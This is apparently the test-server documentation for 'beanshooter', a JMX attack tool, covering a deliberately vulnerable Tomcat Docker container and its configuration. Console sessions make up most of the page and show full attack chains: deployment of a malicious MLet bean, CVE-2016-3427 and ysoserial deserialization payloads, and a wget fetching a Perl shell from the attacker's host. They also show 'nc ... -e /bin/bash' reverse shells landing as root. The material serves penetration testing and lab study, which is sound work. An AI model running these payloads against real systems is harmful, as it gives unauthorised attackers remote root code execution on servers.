### Example Server

----

If you want to test *beanshooter*, you can do this using the docker images provided in this repository.
Two images are provided:

1. A *JMX(MP)* agent based on ``tomcat:8.0.18-jre8``, that is vulnerable to all vulnerabilities that can
   be identified using *beanshooter*.
2. A *JMX(MP)* agent based on ``tomcat:9-alpine``, that is vulnerable to all vulnerabilities that can
   be identified using *beanshooter*, except *CVE-2016-3427*.

Both containers can be build from source, or loaded from *GitHub Packages*.

* To build from source, just clone the repository, switch to the [docker](/.docker) directory and run
  ``docker build .`` to create the container. By default, this creates the ``tomcat:8.0.18-jre8`` image.
  If you want the ``tomcat:9-alpine`` image instead, just replace the ``Dockerfile`` with the
  ``Dockerfile.alternative`` file.
  ```console
  $ git clone https://github.com/qtc-de/beanshooter
  $ cd beanshooter/.docker
  $ docker build .
  ```

* To load the images from *GitHub Packages*, just authenticate using your personal access token and
  run the corresponding pull command:
  ```console
  $ sudo docker login https://docker.pkg.github.com -u <USERNAME>
  Password:

  Login Succeeded
  $ docker pull docker.pkg.github.com/qtc-de/beanshooter/tomcat8-jmxmp:1.0
  ```

If you want to change the default configuration of the container, you can use the [docker-compose.yml](/.docker/docker-compose.yml)
file and adopt the corresponding options.


### Configuration Details

-----

The following listing shows the *Java options* that are used by the *Java Virtual Machine*:

```java
-Dcom.sun.management.jmxremote
-Dcom.sun.management.jmxremote.local.only=false
-Dcom.sun.management.jmxremote.authenticate=false
-Dcom.sun.management.jmxremote.port=9010
-Dcom.sun.management.jmxremote.rmi.port=9011
-Djava.rmi.server.hostname=iinsecure.dev
-Djavax.net.ssl.keyStorePassword=password
-Djavax.net.ssl.keyStore=/opt/store.p12
-Djavax.net.ssl.keyStoreType=pkcs12
-Dcom.sun.management.jmxremote.ssl=true
-Dcom.sun.management.jmxremote.registry.ssl=true
```

By default, the container uses *SSL* on both, the *rmiregistry* and for *Remote object* connections. The corresponding hostname is
``iinsecure.dev`` and can be added to your ``/etc/hosts`` file for testing (it is not really required, as *beanshooter* performs
automatic redirection to the actual targeted host). The following (*JMX* related) ports are open on the container:

* *RMI Registry*: ``Port 9010 - SSL Protected``
* *JMX Access*: ``Port 9011 - SSL Protected``

Additionally, the container opens 5 *JMXMP* listeners:

* *JMXMP PLAIN*: ``Port 5555``
* *JMXMP TLS*: ``Port 5556 - TLS Protected``
* *JMXMP TLS SASL/PLAIN*: ``Port 5557 - TLS Protected & SASL PLAIN auth``
* *JMXMP TLS SASL/Digest*: ``Port 5558 - TLS Protected & SASL Digest auth``
* *JMXMP TLS SASL/Cram*: ``Port 5559 - TLS Protected & SASL Cram auth``
* *JMXMP TLS SASL/NTLM*: ``Port 5560 - TLS Protected & SASL NTLM auth``

The container does not define any security policy for *JMX*. Therefore, when used with authentication, certain operations
like creating new *MBeans* on the server probably do not work.


### Some Test Cases

-----

In the following, some example test cases and the behavior of ``beanshooter`` are shown.

#### SSL Protected Registry

After starting the *JMXMP* container, you can run ``beanshooter`` with the *status* action. As *SSL* is enabled by
default for the *RMI registry*, running ``beanshooter`` without the ``--ssl`` option will fail:

```console
[qtc@kali ~]$ beanshooter 172.17.0.2 9010 status
[+] Connecting to JMX server... failed!
[-] The following exception was thrown: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException [Root exception is java.rmi.ConnectIOException: non-JRMP server at remote endpoint]
```

Running with the ``--ssl`` option, on the other hand, should work fine:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 status
[+] Connecting to JMX server... 
[*]    RMI object tries to connect to different remote host: iinsecure.dev
[*]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

#### MLet Deployment

This is already presented in the projects main [README.md](/README.md). However, for completeness, it is also demonstrated here:

```console
[qtc@kali ~]$ beanshooter --stager-host 172.17.0.1 --ssl 172.17.0.2 9010 deployAll
[+] Connecting to JMX server... 
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+] 	Redirecting the connection back to 172.17.0.2... 
[+] 	This is done for all further requests. This message is not shown again.
[+] Creating MBeanServerConnection... 
[+] Creating MBean 'MLet' for remote deploymet... done!
[+] 	MBean 'MLet' did already exist on the server.
[+] 
[+] Malicious Bean seems not to be registered on the server
[+] Starting registration process
[+] 	Creating HTTP server on 172.17.0.1:8080
[+] 		Creating MLetHandler for endpoint /mlet
[+] 		Creating JarHandler for endpoint /tonka-bean.jar
[+] 		Starting the HTTP server... 
[+] 		
[+] 		Received request for /mlet
[+] 		Sending malicious mlet:
[+] 		
[+] 			Class:		de.qtc.tonkabean.TonkaBean
[+] 			Archive:	tonka-bean.jar
[+] 			Object:		MLetTonkaBean:name=TonkaBean,id=1
[+] 			Codebase:	http://172.17.0.1:8080
[+] 			
[+] 		Received request for /tonka-bean.jar
[+] 		Sending malicious jar file... done!
[+] 		
[+] 	malicious Bean was successfully registered
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 execute id
[+] Connecting to JMX server... 
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+] 	Redirecting the connection back to 172.17.0.2... 
[+] 	This is done for all further requests. This message is not shown again.
[+] Creating MBeanServerConnection... 
[+] Sending command 'id' to the server... 
[+] Servers answer is: uid=0(root) gid=0(root) groups=0(root)
```

#### JMXMP

The following example shows a simple connection to the plain *JMXMP* endpoint:

```console
[qtc@kali ~]$ beanshooter --jmxmp 172.17.0.2 5555 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

#### JMXMP - SSL

Now the *JMXMP* listener is *SSL protected*. First of all, notice how ``nmap`` flags
this port:

```console
[qtc@kali ~]$ nmap -p 5556 172.17.0.2 -sV
[...]

PORT     STATE SERVICE     VERSION
5556/tcp open  java-object Java Object Serialization
```

Just connecting without *SSL* will lead to the following error:

```console
[qtc@kali beanshooter]$ beanshooter --jmxmp 172.17.0.2 5556 status
[+] Connecting to JMX server... failed!
[-] The following exception was thrown: java.io.IOException: The client does not require any profile but the server mandates one
```

This is because the application server deployed *JMXMP* with the *TLS* profile, which only allows *SSL* connections.
By using the ``--ssl`` option, the connection should work fine:

```console
[qtc@kali ~]$ beanshooter --jmxmp --ssl 172.17.0.2 5556 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

#### JMXMP - SASL/NTLM

Now lets take a look on a *SASL* protected *JMXMP* endpoint that uses the ``TLS SASL/NTLM`` profile. ``nmap`` flags this again as ``Java Object Serialization``
and connection without the appropriate options creates the following error:

```console
[qtc@kali ~]$ beanshooter --jmxmp --ssl 172.17.0.2 5560 status
[+] Connecting to JMX server... failed!
[-] The following exception was thrown: java.io.IOException: The server supported profiles [SASL/NTLM] do not match the client required profiles [TLS].
```

This is nice, as the server informs us about the required connection profile, but working with different *Java* versions showed that this
information is not always returned. However, by using an arbitrary *SASL* mechanism during the client request, it usually gets returned:

```console
[qtc@kali ~]$ beanshooter --jmxmp  --ssl --sasl CRAM-MD5 172.17.0.2 5560 status
[+] Connecting to JMX server... failed!
[-] The following exception was thrown: java.io.IOException: The server supported profiles [TLS, SASL/NTLM] do not match the client required profiles [TLS, SASL/CRAM-MD5].
```

Retrying the connection with the correct profile but wrong credentials looks like this:

```console
[qtc@kali ~]$ beanshooter --jmxmp  --ssl --sasl NTLM --username test --password test 172.17.0.2 5560 status
[+] Connecting to JMX server... failed!
[-] The following exception was thrown: java.lang.SecurityException: javax.security.sasl.SaslException: NTLM: generate response failure [Caused by com.sun.security.ntlm.NTLMException: None of LM and NTLM verified]
```

However, when using the correct credentials, the connection should work again:

```console
[qtc@kali ~]$ beanshooter --jmxmp  --ssl --sasl NTLM --username controlRole --password control 172.17.0.2 5560 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

#### JMXMP - SASL/Digest

One special case is the *SASL/DIGEST-MD5* authentication (at least when using one of the docker images). Unfortunately, the ``com.sun.security.sasl.digest.realm`` property
is ignored by the ``LifecycleListener`` and therefore the hostname of the container is used as the realm for the *Digest Authentication*. This leads to the following
error message when using *Digest Authentication*:

```console
[qtc@kali ~]$ beanshooter --jmxmp  --ssl --sasl DIGEST-MD5 --username controlRole --password control 172.17.0.2 5558 status
[+] Connecting to JMX server... failed!
[-] The following exception was thrown: java.lang.SecurityException: javax.security.sasl.SaslException: DIGEST-MD5: digest response format violation. Mismatched URI: jmxmp/172.17.0.2; expecting: jmxmp/60181e4129fd
```

With a correct configured server, this should not happen. However, one can easily fix it, as the server exposes the correct hostname as part
of the error message. By adding it to the ``/etc/hosts`` file the connection should work again:

```console
[qtc@kali ~]$ cat /etc/hosts | grep 172
172.17.0.2    60181e4129fd
[qtc@kali ~]$ beanshooter --jmxmp  --ssl --sasl DIGEST-MD5 --username controlRole --password control 172.17.0.2 5558 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

#### CVE-2016-3427

The following example shows an successful attack on *CVE-2016-3427*:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 cve-2016-3427 CommonsCollections6 "wget -O /dev/shm/s 172.17.0.1:8000/shell.pl"
[+] Creating ysoserial payload...done.
[+] cve-2016-3427 - Sending serialized Object as credential.
[+]     An exception during the connection attempt is expected.
[+] Connecting to JMX server...
[*]    RMI object tries to connect to different remote host: iinsecure.dev
[*]    Redirecting the connection back to 172.17.0.2... failed!
[*]
[*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
[*]     Target is most likely vulnerable to cve-2016-3427.
```

On the *HTTP listener* you will get the corresponding request:

```console
[qtc@kali ~]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [24/Sep/2020 17:00:02] "GET /shell.pl HTTP/1.1" 200 -
```

Now you can spawn the shell with a second invocation:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 cve-2016-3427 CommonsCollections6 "perl /dev/shm/s"
[+] Creating ysoserial payload...done.
[+] cve-2016-3427 - Sending serialized Object as credential.
[+]     An exception during the connection attempt is expected.
[+] Connecting to JMX server... 
[*]    RMI object tries to connect to different remote host: iinsecure.dev
[*]    Redirecting the connection back to 172.17.0.2... failed!
[*]
[*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
[*]     Target is most likely vulnerable to cve-2016-3427.

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:44830.
id
uid=0(root) gid=0(root) groups=0(root)
```

The response from a patched application server, on the other hand, looks like this:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 cve-2016-3427 CommonsCollections6 "wget -O /dev/shm/s 172.17.0.1:8000/shell.pl"
[+] Creating ysoserial payload...done.
[+] cve-2016-3427 - Sending serialized Object as credential.
[+]     An exception during the connection attempt is expected.
[+] Connecting to JMX server...
[*]    RMI object tries to connect to different remote host: iinsecure.dev
[*]    Redirecting the connection back to 172.17.0.2... failed!
[-] The following exception was thrown: java.lang.ClassCastException: Unsupported type: java.util.HashSet
```

### Application Level Deserialization

The following example shows an authentication protected *JMX* endpoint that does not allow *MLet* usage even for valid user accounts:

```console
[qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.17.0.2 9010 deployAll
[+] Connecting to JMX server... 
[*]    RMI object tries to connect to different remote host: iinsecure.dev
[*]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Creating MBean 'MLet' for remote deploymet... failed!
[-] The following exception was thrown: java.lang.SecurityException: Access denied! Creating an MBean that is a ClassLoader is forbidden unless a security manager is installed.
```

However, even if access to *MLet* is denied, serialization attacks can still work:

```console
[qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.17.0.2 9010 ysoserial CommonsCollections6 "nc 172.17.0.1 4444 -e /bin/bash"
[+] Creating ysoserial payload...done.
[+] Connecting to JMX server... 
[*]    RMI object tries to connect to different remote host: iinsecure.dev
[*]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending payload to 'getLoggerLevel'...
[+]     IllegalArgumentException. This is fine :) Payload probably worked.

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:39177.
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
